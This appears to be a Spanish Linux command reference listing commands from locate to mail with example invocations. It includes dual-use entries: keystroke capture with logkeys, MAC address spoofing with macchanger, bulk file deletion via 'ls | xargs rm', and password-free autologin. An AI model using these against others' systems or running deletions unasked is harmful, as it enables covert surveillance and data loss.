Comentar la linea:
#NEEDSCONFIGFIRST
Y al final del fichero, suprimir o comentar los exsitentes y colocar los de nuestra elección, por ejemplo:
ca_ES.UTF-8
ca_ES.ISO-8859-1
ca_ES.ISO-8859-15@euro
es_ES.UTF-8
es_ES.ISO-8859-1
es_ES.ISO-8859-15@euro
Una vez realizados los ajustes, lanzar la aplicación.


locate
Buscar archivos
$ locate parida.txt
$ locate firefox/plugins


location
Consultar la base de datos de IPFire [base de datos de geolocalización de Internet] y determinar la ubicación en función de su dirección IP.
$ location update (recargar la base de datos)
$ location list-countries --show-continent --show-name (listado de todos los paises con su nombre y continente al que pertenecen)
$ location lookup 2.142.97.159 (localizar una IP)
$ location search-as "linux" (Buscar un sistema por nombre)


lockout
Herramienta que impone disciplina para que pueda realizar algún trabajo. Por ejemplo, el bloqueo se puede utilizar para instalar un firewall que no le permita navegar por la Web. El bloqueo cambia la contraseña de root durante un período específico; esto le impide eliminar secretamente el firewall y luego navegar por la Web de todos modos. En caso de emergencia, puede reiniciar su computadora para deshacer los efectos del bloqueo y restaurar la contraseña de root original.
$ lockout (muestras varios advertimientos sobre la aplicación:)
   !! ADVERTENCIA !!
      Este programa es MUY PELIGROSO.
$ lockout lock 2h30m (cerrar en 2 horas 30 minutos)
$ lockout status (mirar el estado de la aplicación)


logcheck
Herramienta que analiza periódicamente todos los logs del sistema. En la instalación ya se instala como una tarea en el cron en el fichero /etc/cron.d/logcheck.
Para recibir correos con los informes,Editar el fichero:
# nano /etc/logcheck/logcheck.conf
y descomentar o completar las líneas:
	DATE="$(date +'%d-%m-%Y %H:%M')"
	SENDMAILTO="tu@direccion.com"
	REPORTLEVEL="paranoid"
	MAILASATTACH=1


loggedfs
Sistema que puede registrar cada operación que ocurre dentro de un directorio y sus subdirectorios. loggedfs está basado en fuse y solo envía un mensaje a syslog cuando lo llama fuse.
$ loggedfs -f -p /home/user/Documentos (probar el comando sin instalar un archivo de configuración. Mostrar ruta absoluta al directorio)
$ loggedfs -c .config/loggedfs/loggedfs.xml -p /home/user/Documentos (especificando el archivo de configuración)
$ loggedfs -l /var/log/loggedfs.log -c .config/loggedfs/loggedfs.xml -p /home/user/Documentos (especificando archivos de logs)
$ fusermount -u /home/user/Documentos (terminar el registro)
Nota.- Descomentar la linea "user_allow_other" en el archivo /etc/fuse.conf


logger
Enviar mensajes al demonio syslogd
$ logger -i -t gnome-terminal -f /var/log/messages inicio terminal (escribirá en el registro el mesaje “inicio terminal” como remitido por “gnome-terminal” y guardando el PID)


login
Solicitar la contraseña de usuario.
$ login -f  usuario (Inicia nueva sesión dentro de la actual)


loginctl
Realizar una introspección y controlar el estado del administrador de inicio de sesión de systemd.
$ loginctl list-sessions
$ loginctl session-status 1
$ loginctl lock-sessions (pide contraseña y suspende pantalla)
$ loignctl -a (muestra las propiedades de sesión/usuario independientemente de si están configuradas o no)
$ loginctl list-users (lista los usuarios con sesión abierta)
$ loginctl -psessions (muestra todas las sesiones abiertas)
$ loginctl seat-status (muestra todos los procesos que están relacionados con el asiento)
Nota.- "Seat" permite conectar varios conjuntos de hardware (ratón, teclado, pantalla) y utilizarlo por varios usuarios al mismo tiempo. Por lo general, esta función no se utiliza y la utilidad muestra solo un "asiento".


logkeys
Registrar las pulsaciones que se realizan en el teclado. Descarga de <https://github.com/kernc/logkeys>
$ touch test.log (crear el fichero donde gaurdar las pulsaciones)
$ logkeys -s -m es.map -o test.log (arrancar la aplicación, con teclado español y guardar en el archivo creado)
$ logkeys -k (parar y consultar test.log)
Nota.- Los mapas de teclado para descargar estan en <https://github.com/kernc/logkeys/tree/master/keymaps>


logname
Devuelve el nombre del usuario actual


logout
Cerrar sesión de usuario. En las ttys, las cerrará para volver a entrar el login.
$ logout


logresolve
Resolver direcciones IP a nombres de host en archivos de registro de Apache. Para minimizar el impacto del servidor de nombres, logresolve tiene su propia caché interna de tablas de control. Esto significa que cada número IP sólo se buscará la primera vez que se encuentre en el archivo de registro.
# logresolve < /var/log/apache2/access.log > logresoslve.txt


logrotate
Rotación, compresión y correos del sistema de logs.
# logrotate -d /etc/logrotate.conf (Verificación del correcto funcionamiento)
# logrotate -f /etc/logrotate.conf  (forzar la verificación)
Ejemplo típico para rotar logs de fail2ban:
# nano /etc/logrotate.d/fail2ban
	/var/log/fail2ban.log {
	weekly		# rotado semanal
	rotate 4	# numero maximo de ficheros rotado
	compress	# comprimir cuando se rote
	notifempty      # no rotar el log si esta vacio
	missingok	# continuar sin error si el fichero no existe
	create 640 root adm	# permisos, propietario y grupo del fichero rotado
	postrotate	# tarea a realizar despues del rotado
		fail2ban-client flushlogs 1>/dev/null
	endscript
	}
1.-
Por defecto, se añade un numero al fichero rotado. Si queremos que se use la fecha:
# nano /etc/logrotate.conf
Añadir la linea:
dateext


logsave
Guardar la salida de una orden en un archivo de registro.
$ logsave -a file.log ifconfig (Añadiendo la salida al contenido existente)


logstalgia
Software para visualizar ficheros de log que registra las peticiones de los visitantes al servidor web como si fueran pelotas que van llegando del lado izquierdo, el servidor simula ser una raqueta que devuelve las peticiones con códigos como 200 (OK) 302 (redirigido a…) o el 404 (no encontrado).
# logstalgia /var/log/apache2/access.log


logtool
Analizador de archivos de registro y generador de informes de estilo syslog, capaz de producir ANSI, ASCII, CSV, HTML o simplemente resultados sin formato.
$ cat /var/log/messages | logtool -t -s -p short -o HTML > /home/pep/logs/messages.html (formato de la hora corto [HH:MM] y no mostrar el campo "fuente" ni el campo "programa")


logtop
Herramienta para analizar el archivo de registro de logs como entrada.
# tail -f /var/log/apache2/access.log | logtop


logwatch
Analiza los archivos de logs del sistema. El sistema está pensado para que toda la configuración sea especificada en /etc/logwatch y estas directivas sobreescriban a las que están en /usr/share/logwatch. Copiamos la configuación básica:
# cp /usr/share/logwatch/default.conf/logwatch.conf /etc/logwatch/conf
Los servicios y qué ficheros de log es capaz de procesar logwatch en /usr/share/logwatch/default.conf/logfiles y la configuración de logwatch para cada servicio en /usr/share/logwatch/default.conf/services.
Configuración básica sin envio por email:
# nano /etc/logwatch/conf/logwatch.conf
# indica el directorio donde tomara los logs
LogDir = /var/log
# Salida {mail|stdout|file}
Output = file
# formato de la salida {html|text}
Format = text
# Indicar que busque información en los archivos /var/log/message.1 o /var/log/messages.1.gz y no solo en /var/log/messages
Archives = Yes
# Dia a analizar {Yestedary|Today|all}
Range = All
# Detalles de los logs (0-10)|(Low,Mid,High)
Detail = 8
# Servicios monitorizados {service_name|all}
# Service = fail2ban (Especificando servicio o todos):
Service = All
Notas.- Es posible poner todos los servicios y descartar algunos con Service = --fail2ban. Si el archivo de logs no está en el fichero especificado editar el servicio concreto de /usr/share/logwatch/default.conf/services y modificarlo.
# mkdir /var/cache/logwatch (Crear el directorio, si no existe, donde se guardarán las carpetas con los informes)
Lanzar logwatch cada hora:
# crontab -e
Y colocar la linea:
0 1  * * *   root       /usr/sbin/logwatch


lolcat
Colorear texto.
$ bash | lolcat -a -s 250
$ fortune | cowsay -f tux | lolcat -s 64
$ ls | lolcat -a


look
Muestra entradas del diccionario que comienzan por esa palabra [/usr/share/dict/words]
$ look palabra


lookatme
Herramienta de presentaciones extensible basada en terminal que representa documentos Markdown y admite temas, resaltado de sintaxis, recarga de fuentes en vivo y manual y puede incrustar archivos externos y terminales en vivo en diapositivas. Algunos ejemplos de la propia aplicación:
$ lookatme /usr/share/doc/lookatme/examples/file_loader_ext/example.md
# lookatme /usr/share/doc/lookatme/examples/terminal_ext/example.md
# lookatme /usr/share/doc/lookatme/examples/progressive.md


lorem
[libtext-lorem-perl]
Crear textos aleatorios a partir del famoso lorem ipsum.
$ lorem -p 4 (Generar 4 párrafos)
$ lorem -w 10 (Generar 10 palabras)
$ lorem -s 2 (Generar 2 sentencias)


losetup
Programa para mostrar información sobre los dispositivos /dev/loop. Útil para saber donde se montan ciertos ficheros .img
$ losetup (muestra dispositivos /dev/loop y el fichero asociado)
# losetup -a (muestra toda la información de los dispositivos /dev/loop)
# losetup --find --show fichero.img (Encuentra y muestra a que dispositivo está asociado un fichero img)


lost+found
Carpeta donde el sistema almacena archivos marcados como dañados después de una comprobación de disco realizada con el comando fsck.


lp
Gestión de impresoras y trabajos de impresión. Aunque los comandos lp y lpr son distintos pero relacionados se han tratado en el mismo espacio.
$ lp fichero (imprime fichero con la impresora predeterminada)
$ lpr fichero (Imprimir un fichero)
$ lpr -P Otra_impresora fichero (Especificando una impresora)
$ lp -d otra_impresora fichero (Imprime con una impresora especificada)
$ lpq           (muestra los trabajos pendientes y les asigna un número)
$ lprm 5      (borra el trabajo pendiente de impresión especificado [5])
$ lprm -P HP_psc_1100_series - (Borrar todos los trabajos pendientes de la impresora especificada)
$ lprm - (Borra todos los trabajos pendientes de la predeterminada)
$ lpstat -p -d (muestra la impresora predeterminada)
$ lpstat -a           (muestra todas las impresoras)
$ lpstat -v           (indicando ubicación)
$ lp -n 10 fichero   (imprimirá 10 copias [opciones de 1 a 100])
$ lp -P 7,9,12-15 fichero (imprime las páginas indicadas y de la 12 a la 15)
$ lp -o media=A4 fichero (especificando tipo de papel o sobre)
Opciones “media”:
Letter – US Letter (216x279mm).
Legal – US Legal (216x356mm).
A4 – ISO A4 (210x297mm).
COM10 – US 10 Envelope (241x105mm).
DL – ISO DL Envelope (220x110mm).
$ lp -o media=Custom.ANCHOxLARGOmm fichero (con un papel de medida indicada)
$ lp -o landscape fichero (rotar 90º la impresión. Imprimir apaisado)
$ lp -o orientation-requested=4 fichero (lo mismo que el anterior)
1.-
Cuando al intentar imprimir sale el mensaje: Error - Scheduler Not Responding:
$ nano .bashrc
Y añadir la linea:
export CUPS_SERVER=localhost
2.-
Archivo de configuracion:
$ nano /etc/printcap
	lp|Generic dot-matrix printer entry:\
        	:lp=/dev/lp0:\
        	:sd=/var/spool/lpd/lp:\
	        :af=/var/log/lp-acct:\
	        :lf=/var/log/lp-errs:\
	        :pl#66:\
	        :pw#80:\
	        :pc#150:\
	        :mx#0:\
	        :sh:


lpadmin
Añadir impresoras.
$ lpadmin -p nombre_local -v usb://dispositivo -m driver
$ lpadmin -x nombre_local (eliminar una impresora)
Opciones:
-L (añadir una ubicación [-L "oficina"])
-D (añadir descripción [-D "impresora compartica"])


lpinfo
Lista los dispositivos o controladores disponibles conocidos por el servidor CUPS. Comandos relacionados: lpstat, cupsreject, cupsenable, cupsaccept, cupsdisable y lpadmin.
$ lpinfo -m (lista los drivers)
$ lpinfo -v (lista los dispositivos)


lpoptions
Información sobre las impresoras en cups
$ lpoptions -d HP_psc_1100_series (Establecer la impresora predeterminada)
$ lpoptions -p HP_psc_1100_series -l (Ver las opciones de la impresora predeterminada)


lpstat
Comprobar el estado de la impresora.
$ lpstat -t


lr
Herramienta para generar listados de archivos tipo ls.
$ lr -1 (solo directorios incluso los ocultos)
$ lr -l1Aon | column (sin los ocultos y ordenados por nombre)


ls
Listar archivos de un directorio.
$ ls -i (Muestra todos los archivos no ocultos)
$ ls -a (Muestra todos los archivos, incluso los ocultos)
$ ls -l (Muestra permisos, último acceso i propietarios)
$ ls -1 (muestra en un listado)
$ ls -F (Muestra a continuación de cada elemento si se trata de un directorio [/], un ejecutable [*] o un enlace [@])
$ ls -F | grep '/$' (Lista solo directorios)
$ ls -F | grep -v '/$' (Lista solo los archivos)
$ ls -L (En los enlaces, se muestra el archivo al que apuntan)
$ ls -l PID (Muestra qué está corriendo con el PID especificado)
$ ls -R	(recursivamente)
$ ls -Z (listar visualizando los contextos en selinux [ver])
$ ls -s	(Muestra el tamaño)
$ ls -S (Lista por tamaño)
$ ls ../ (Listar los archivos del directorio anterior)
$ ls -t	(lista por fecha de modificación de más nuevo a más viejo)
$ ls /boot /usr (Lista los dos directorios especificados)
$ ls -ad *.sh (lista los terminados en .sh)
$ ls *.{odt,txt} (Lista los de las extensiones mencionadas)
$ ls -ad */ (Lista sólo los directorios)
$ ls -alL /home/usuario/videos
$ ls -l /lib/modules (muestra los kernels instalados)
$ ls | xargs rm (Eliminar todos los archivos)
$ ls @(*.sh|*.txt) (Sólo mostrará las extensiones especificadas. Precisa activación de los comodines extendidos de bash con: shopt -s extglob)
$ ls !(*.sh|*.txt) | xargs rm (Elimina todos menos los mencionados)


lsat
Herramienta de auditoria de seguridad. Emplea mucho tiempo y crea un fichero de varias megas (lsat.out)
$ lsat


lsattr
Muestra los atributos de los ficheros [no los permisos]. (ver chattr)
$ lsattr -R /home/usuario   (recursivamente)
$ lsattr -a /home/usuario   (incluye a todos los archivos de los directorios)
Un ejemplo completo:
	$ touch archivo.txt (crear el fichero)
	$ lsattr archivo.txt (ver los atributos)
	--------------e---- archivo.txt (resultado)
	# chattr +i -A archivo.txt (Agregar el atributo inmutable y que no se modifique el atime)
	$ lsattr archivo.txt (ver los nuevos atributos)
	----i--A------e---- archivo.txt


lsblk
Muestra información de los dispositivo montados.
$ lsblk (los muestra todos)
$ lsblk -a /dev/sda
$ lsblk -f /dev/sda (Mostrando etiquetas, uuids y puntos de montaje)
$ lsblk -m /dev/sda (Mostrando propietarios, grupos y permisos)


lsb_release
Muestra nombre y código del sistema operativo
$ lsb_release -a
$ cat /etc/*-release (lo mismo)


lscpu
Muestra información sobre la cpu


lsd
listar directorios. Un comando ls con más colorido.
$ lsd -a (mostrar todo incluso los archivos y directorios ocultos)
$ lsd -l -R (mostrar los archivos, directorios y subdirectorios con sus atributos)
$ lsd --tree (en forma de arbol)
$ lsd -d --tree (solo mostrar los directorios y en forma de arbol)
$ lsd --classic (mostrar parecido a ls)


lsdev
[procinfo]. Lista los dispositivos presentes en el sistema y que IRQs y puertos IO (entrada/salida) usan.
$ lsdev


lsfd
[util-linux-extra]. Lista de descriptores de archivos. Está pensado para ser un reemplazo de lsof pero centrado en el núcleo de Linux
# lsfd --summary=only (informa de los números de descriptores de sockets netlink y descriptores de sockets unix)
# lsfd --pid "$(pidof firefox)" (listar los archivos descriptores asociados con "firefox")
# lsfd -Q 'DELETED' (lista de archivos descriptores eliminados asociados a procesos)
# lsfd -Q 'TYPE != "REG"' (lista de archivos descriptores no regulares)


lshal
Mostrar elementos en la base de datos del dispositivo HAL [Hardware Abstraction Layer]. Muestra información del firmware, serial server, Bios, kernel, procesador, discos, puntos de montaje, particiones, usb, pci... HAL está en desuso en la mayoría de las distribuciones Linux. La funcionalidad se está fusionando en udev.
$ lshal  (Información de los dispositivos de HAL en formato largo y detallado))
$ lshal -l (Lo mismo que el anterior)
$ lshal -s (Muestra el UDI [Dispositivo identificador único])
$ lshal -st (Lo mismo pero en forma de arbol)
$ lshal -m (Monitor de los dispositivos de HAL mostrando cambios de estado en tiempo real al conectar un dispositivo)
$ lshal -u UDI (Muestra información de un dispositivo específico)
# lshal -t (visualizar los dispositivos organizados en árbol)


lshell
shell restrictiva para permitir a usuarios acceder via ssh al sistema limitando sus privilegios. Algunas modificaciones en el archivo de configuración:
# nano /etc/lshell.conf
	...
	[global]
	# archivo de logs
	logpath         : /var/log/lshell/
	...
	[default]
	...
	# Comandos permitidos
	allowed         : ['ls','echo','cd','ll','cat','more','nano']
	# Mensaje al arrancar
	intro           : "*** Entrando en la máquina con privilegios limitados *** Pulsar '?' o 'help' para listar comandos autoritzados"
	# Si el usuario tiene una carpeta personal
	home_path       : '/home/USUARIO/'


lshw
Muestra información de toda la máquina
$ lshw -html > hardware.html (Mandar la información a un archivo html)
# lshw -C network (Ver los dispositivos de red instalados)


lsipc
Muestra información sobre las facilidades de comunicación entre procesos para las cuales el proceso de llamada tiene acceso de lectura.
$ lsipc -g -b (mostrar información sobre todos los recursos y mostrarlos en bytes)
$ lsipc -l


lsirq
[utils-linux-extra]. Utilidad que muestra información de interrupcines del kernel.
# lsirq -P (resultados en forma de pares clave="valor")
# lsirq -S (muestra información de softirqs [controladores de interrupciones de software])


lslogins
Mostrar información sobre usuarios conocidos en el sistema.
$ lslogins -g USER user (Información del grupo "user")
$ lslogins -l (listado)


lsmod
Listar todos los módulos cargados del kernel, y alguna información adicional de ellos.


lsmount
Alinea y colorea la salida de /proc/mounts para que sea más cómoda de leer.
$ lsmount


lsns
lista información sobre todos los espacios de nombres actualmente accesibles o sobre el espacio de nombres dado.
$ lsns -t cgroup
$ lsns -t pid
$ lsns -l


lsof
Listar ficheros o procesos abiertos
# lsof -i :4662  (servicios usados por el puerto 4662 aunque esten a la escucha)
# lsof -X (Desactiva la identifiación de conexiones)
# lsof -i@lapipaplena.homelinux.com  (verificar conexiones con una máquina)
# lsof -i@88.25.114.11   (lo mismo pero especificando la ip)
# lsof -i | grep ssh  (Para que muestre solo los que usan el protocolo ssh)
# lsof +D /var/log  (Mostrar los servicios que tiene abierto un directorio)
# lsof fichero  (Muestra los servicios que tiene abiertos fichero)
# lsof -nPi TCP   (Muestra los eventos de red de las conexiones TCP)
# lsof -p PID  (Ficheros que tiene abierto determinado proceso)
# lsof -N      (Muestra los archivos NFS abiertos)
# lsof -c firefox   (Muestra los ficheros abiertos por firefox)
# lsof -P -i -n -sTCP:LISTEN (listado de puertos en LISTEN)
# lsof -i -P | grep -i "listen" (otra forma de listarlos)
# lsof -i tcp -i udp  (lista puertos tcp y udp abiertos)
# lsof -Pni | grep LISTEN   (chequear puertos abiertos)
# lsof -c bash -r  (Monitorizar un proceso)
# lsof -i :631 | awk '{print $1,$2}' | sort -u  (muestra pid y demonio del puerto especificado)
# lsof -t -i :22 (Muestra el pid del puerto especificado)
# lsof -nPi | txt2html  > lsof.html (Mandar la salida a un html para visualizarlo por el navegador)
Opciones:
	-P (Muestra los números de puerto en vez de la aplicación que corre en ellos)
	-n (Para que no resuelva las IP de las conexiones)
	-i (Hace referencia a los eventos utilizados por procesos de red)
	-u usuario (Muestra los procesos abiertos por “usuario”)
	-x (Sigue links y puntos de montaje)
1.-
Resolver salida:
	lsof: WARNING: can't stat() tracefs file system /sys/kernel/debug/tracing
Lanzar como root:
# umount $(mount | grep debugfs | awk '{print $3}')


lspci
Para averiguar todos los dispositivos pci
$ lspci | grep Ethernet  (listar dispositivos pci relacionados con la red)
$ lspci | grep VGA   (conocer la tarjeta gráfica)


lspcmci
Muestra los dispositivos pcmci.


lspgpot
Extraer los valores ownertrust de los llaveros PGP y los lista en formato GnuPG ownertrust.
# lspgpot


lspower
[powermgmt-base]. Enumera las fuentes de energía que el sistema conoce y su estado.
$ lspower (En un pc de escritorio mostrará: "Sin sensores de suministro de energía; eso es normal en una computadora de escritorio")


lsscsi
Muestra información de los discos duros y unidades de DVD o tarjetas que tengamos conectados al PC
$ lsscsi (Muestra un resumen de las unidades)
$ lsscsi -l (Muestra información extendida de las unidades)
$ lsscsi -L (Muestra información aún más extensa de las unidades, en varias líneas)
$ lsscsi -s (Mostrando la capacidad)


lsusb
Ver los puertos USB y los dispositivos conectados a ellos. De vez en cuando ha de actualizarse la lista de los dispositivos reconocidos por nuestro equipo con:
# update-usbids
$ lsusb -d 046d:c00e (De un dispositivo determinado especificando fabricante y producto)
$ lsusb -s 006:002 (De un dispositivo determinado especificando bus y número dispositivo)


luakit
Navegador web
$ luakit
$ torify luakit (si queremos invisibilidad))
En antiguas versiones la configuración era:
Copiar los archivos de configuración:
	$ cp -r /etc/xdg/luakit .config/
El archivo de configuración de los parámetros generales (página de inicio, motor de busqueda, …):
	$ nano .config/luakit/globals.lua
Pero a partir de la versión del mayo de 2018 solo se precisa el archivo:
	$ nano  .config/luakit/userconf.lua
con el siguiente contenido como ejemplo:
    -- Settings (the commented ones do not [yet] work)
    local settings = require "settings"
    settings.window.home_page                             = "https://lapipaplena.wordpress.com"
    settings.window.scroll_step                           = 60
    settings.window.zoom_step                             = 0.2
    settings.window.new_window_size                       = "1200x600"
    settings.window.load_etc_hosts                        = false
    -- settings.vertical_tabs.sidebar_width                  = 200
    settings.webview.zoom_level                           = 120
    settings.webview.zoom_text_only                       = true
    settings.webview.enable_webgl                         = true
    settings.on["youtube.com"].webview.enable_javascript  = true
    settings.on["youtube.com"].webview.enable_plugins     = true
    settings.window.search_engines.archwiki               = "https://wiki.archlinux.org/?search=%s"
    settings.window.search_engines.aur                    = "https://aur.archlinux.org/packages.php?O=0&K=%s&do_Search=Go"
    settings.window.search_engines.duckduckgo             = "https://duckduckgo.com/?q=%s"
    settings.window.search_engines.github                 = "https://github.com/search?q=%s"
    settings.window.search_engines.google                 = "https://google.com/search?q=%s"
    settings.window.search_engines.imdb                   = "http://www.imdb.com/find?s=all&q=%s"
    settings.window.search_engines.ncbi                   = "https://www.ncbi.nlm.nih.gov/gquery/?term=%s"
Atajos de teclado en:
	$ nano .config/luakit/binds.lua
Algunos de los mismos son:
Desplazamiento y visialización:
	j (bajar por la página)
	k (Subir)
	h (Hacia la izquierda)
	l (Hacia la derecha)
	Page_Up (Ir al principio de la página)
	Page_Down (Ir a final de la página del todo)
	^d (Desplazamiento rápido hacia el final de la página)
	^u (Desplazamiento rápito hacia el principio de la página)
	+ (Aumentar medida de la fuente)
	- (Disminuir la medida de la fuente)
	= (Restablecer los parámetros por defecto)
	F11 (Pantalla complet)
Abrir/ cerrar páginas y pestañas
	o (Abrir url [:open....])
	O (Edita la barra de direcciones para modificar la url)
	t (Abrir url en una nueva pestaña [:tabopen....])
	^t (Abrir nueva pestaña con la página de inicio)
	T (Edita la barra de direcciones y la abre en una nueva pestaña)
	d (Cierra la pestaña activa)
	D (Cierra la ventana activa)
	u (reabre la última pestaña cerrada)
	w (Nueva ventana)
Moverse por la página
	^o (página anterior)
	^i (página siguiente)
	gt (ir a la pestaña anterior)
	gT (ir a la pestaña siguiente)
	gh (ir a la página de inicio)
	b (Volver a la página anterior)
	:f (Ir a la página siguiente)
	f (Marca todos los enlaces con un número y si se teclea se entra en el enlace)
	F (Lo mismo pero en una nueva pestaña)
	r (Recargar la página)
	R (Recargar ignorando la caché)
Direcciones de interés
	B (Escribe la página actual en los enlaces de interés)
	gb (Abrir los enlaces de interés en la pestaña actual)
	gB (Lo mismo en una nueva pestaña)
	ZZ (Cerrar guardando las pestañas abiertas)
Descargas
	;s (Marcará todas las descargas con un número que si se tecla se procederá a descargar)
	gd (Abrir la página que muestra todas las descargas activas en la pestaña activa)
	gD (Lo mismo en una nueva pestaña)
Si una vez abierta la barra de navegación [con “o”, “t”..] colocamos:
	gg palabra (Buscará palabra en googl)
	ddg palabra (lo hará en el buscador duckduckgo)
	wp palabra (La buscará en la wikipedia)
	yu palabra (En youtube)


luit
Utilidad para traducir el conjunto de caracteres de un programa para que su salida se pueda mostrar correctamente en un emulador de terminal que usa un juego de caracteres diferente. El objetivo principal de luit es permitir que las aplicaciones "heredadas" que usan juegos de caracteres distintos de UTF-8 funcionen con emuladores de terminal contemporáneos.
$ LC_ALL=ja_JP luit (modifica la terminal a la codificación japonesa. Es preciso tener instalada la codificación)
$ luit -list | grep ISO885
$ luit -encoding 'ISO 8859-1' xterm


lxde
Escritorio ligero. Sus componentes:
	pcmanfm (gestor de archivos)
	lxlauncher (lanzador de aplicaciones)
	lxpanel (panel de escritorio)
	lxsession-edit (cambiar el gestor de ventanas y las aplicaciones ejecutadas al inicio)
	lxsession  (gestor de sesiones con las opciones cerrar, reiniciar y suspender)
	lxappearance  (gestor de temas. Permite cambiar el aspecto, iconos  y tipografías)
	leafpad (editor de texto)
	xarchiver  (gestor de archivos comprimidos)
	gpicview (visor de imágenes)
	lxterminal (Consola)
	lxtask  (administrador de tareas y monitor de sistema)
	openbox  (gestor de ventanas)
	lxrandr (gestor de resolucaión de pantalla y monitores externos)
	lxshortcut (editor de lanzadores)
	lxmusic (reproductor de música basado en xmms2)
Archivos de configuración de los elementos del escritorio lxde:
	~/.config/gtkrc-2.0 (Temas de escritorio GTK+ e iconos)
	~/.config/leafpad/leafpadrc (Editor de textos Leafpad)
	~/.config/lxpanel/LXDE/panels/panel (Paneles)
	~/.config/lxpanel/LXDE/config (Lanzadores de aplicaciones del panel)
	~/.config/lxsession/LXDE/config (Administrador de ventanas)
	~/.config/lxterminal/lxterminal.conf (Terminal)
	~/.config/openbox/lxde-rc.xml (Openbox)
	~/.config/openbox/menu.xml (Menu de Openbox)
	~/.config/pcmanfm/main.lxde (Pcmanfm)
1.-
Arrancar aplicaciones al inicio:
# /etc/xdg/lxsession/LXDE/autostart
Colocar las aplicaciones precedidas de una @:
	@liferea
	@gdesklets
2.-
Crear iconos en el escritorio:
Colocar los archivos en la carpeta Desktop o Escritorio si se tiene en español:
$ nano Desktop/home.lnk
Y colocamos el siguiente contenido de ejemplo:
	[Desktop Entry]
	Name=Personal
	Type=Application
	Comment=Carpeta personal
	Terminal=false
	Exec=pcmanfm ~/
	Icon=folder_home.png
	Encoding=UTF-8
Para colocar la papelera:
	$ nano Desktop/papelera.lnk
	Y pegar el contenido:
	[Desktop Entry]
	Name=Papelera
	Type=Application
	Comment=Papelera
	Terminal=false
	Exec=pcmanfm trash:///
	Icon=emptytrash.png
	Encoding=UTF-8
3.-
Modificar iconos:
$ ls /usr/share/icons/ (Ver el listado de los disponibles)
# nano  /usr/share/icons/default/index.theme
Y en apartado Inherits colocar el deseado:
Inherits = ComixCursors-Red-Large
Reiniciar.
4.-
Para no cambiar de escritorio con movimientos del mouse comentar el siguiente código del lxde-rc.xml con <!-- y -->:
      <!--
      <mousebind button="Up" action="Click">
        <action name="DesktopPrevious"/>
      </mousebind>
      <mousebind button="Down" action="Click">
        <action name="DesktopNext"/>
      </mousebind>
      -->
5.-
Si queremos que alguna aplicación se abra en determinado escritorio:
$ nano .config/openbox/lxde-rc.xml
Colocar el siguiente código en el apartado applications:
	<application class="Firefox">
		<desktop>2</desktop>
	</application>
Esto abrirá firefox en el escritorio 2
6.-
Para arrancar el sistema sin colocar la contraseña:
# nano /etc/lxdm/lxdm.conf
Y en elk apartado [base] descomentamos la linea:
  autologin=usuario


lxlock
Bloquea la sesión del usuario usando el protector de pantalla. Entrando la contraseña se desbloquea.
$ lxlock


lxpanelctl
Controla lxpanel.
$ lxpanelctl menu (abre el menú de lxpanel)
$ lxpanelctl config (Su configuración)
$ lxpanelctl run (Cuadro para entrar una aplicación para ejecutarla)
Otras opciones:
restart (Reiniciarlo)
exit (Matarlo)


lynis
Busca en el sistema posibles debilidades de configuración sin realizar ninguna modificación.
# lynis (Visualizar las opciones)
# lynis --check-update (descargar actualizaciones)
# lynis -c (lanzar el escaneo)
# lynis --cronjob (Lanzar el escaneo sin pedir confirmaciones en cada apartado)
# cat /var/log/lynis.log | grep Warning (ver las vulnerabilidades)
# cat /var/log/lynis.log | grep Suggestion (ver sugerencias que nos realiza lynis)


lynx
Navegador web por consola.
$ lynx -dump http://www.tuxapuntes.com | grep Enviado  (Ver las últimas entradas en la web especificada)
$ lynx -dump http://www.tuxapuntes.com | grep Enviado | grep templix (Ver si entre las últimas entradas hay alguna del usuario templix)
$ lynx -source http://www.tuxapuntes.com (ver el codigo fuente)
$ lynx -dump http://checkip.dyndns.com | cut -d ' ' -f7 (mostrar IP externa)
$ lynx -dump http://www.tuxapuntes.com | awk '/http/{print $2}' | egrep "^https{0,1}"   (ver todos los enlaces de una web)
$ lynx -dump http://www.lapipaplena.com/ | awk '/http/{print $2}' | sort -  (Lo mismo)


lz4
Comprimir y descomprimir ficheros.
$ lz4 file (forma básica para comprimir un fichero)
$ lz4 -d file.lz4 (descomprimir)
$ lz4 -t file.lz (test de integridad de un archivo comprimido)


lzip
Compresor de archivos que utiliza la técnica de compresión LZMA2 y ofrece una alta compresión sin pérdida de datos. Lzip descomprime casi tan rápido como gzip y comprime mejor que bzip2.
$ lzip archivo.txt (comprimirá el archivo archivo.txt en un archivo llamado archivo.txt.lz)
$ lzip archivo1.txt archivo2.txt archivo3.txt (Comprimir todos los archivos especificados en archivos comprimidos con sufijo .lz)
$ echo "linux es sistema genial" | lzip - (comprimir la salida estándar del echo)
$ unlzip archivo.txt.lz > descompresion.txt (descomprimir)
$ lzip --test archivo.txt.lz (verificar si el archivo comprimido está intacto)
$ lzip -I archivo.txt (permitir interactivamente seleccionar qué partes del archivo se comprimen)
$ lzip -9 archivo.txt (usa el nivel más alto de compresión)
$ lzip -e archivo.txt (comprimir y eliminar original)


lzma
Compresor/descompresor de archivos. Formato de salida .lzma
$ lzma fichero.txt (Substituye fichero.txt por fichero.txt.lzma)
$ lzma -d fichero.txt.lzma (Descomprimir)


macchanger
Modificar la MAC
# macchanger -s eth0 (Muestra la MAC)
# macchanger -m 00:01:02:03:04:05 eth0  (poner la tarjeta de red a la escucha por la interfaz eth0 con la MAC especificada)
# macchanger -A eth0 (Establece proveedor MAC aleatorio)
# macchanger -r eth0  (MAC completamente aleatoria)
# macchanger -l  (Listar los comienzos de las MAC de los principales fabricantes)
# macchanger –-list=Sony   (Muestra los comienzos de las MAC de Sony)


magicrescue
Recuperar archivos borrados
$ magicrescue -d /home/usuario/rescue -r /usr/share/magicrescue/recipes/avi /dev/sda3
Notas.-
-d .- Destino de los archivos recuperados
-r  .- Tipo de archivo a recuperar (formatos en /usr/share/magicrescue/recipes)
El último parametro indica el disco a analizar


mail
mandar correos en linea de consola.
$ mail -v usuario@gmail.com
	Subject: pruebas de mail
	Cuerpo del mensaje
	.    (el punto cierra el mensaje)
	Cc:   (intro)
	$
$ cat archivo.txt | mail -s "pruebas" usuario@gmail.com
$ echo "pepe" | mail -s "Asunto" usuario@gmail.com
$ echo "pepe" | mail -s "Asunto" usuario@dominio -c usuario2@dominio  -c usuario3@dominio  (con varios destinatarios)
-v .- muestra todo el proceso hasta el destinatario.
-s .- asunto del mail.
-b .- Enviar copias ocultas a la lista. Nombres separada por comas.
1.-
Como correo del sistema:
	$ mail (Muestra los correos del sistema)
	& (indica que estamos en el prompt del comando mail)
Opciones disponibles:
	d (borra el mensaje marcado con '>' en el listado)
        d 1-8 (Borra los mensajes del 1 al 8)
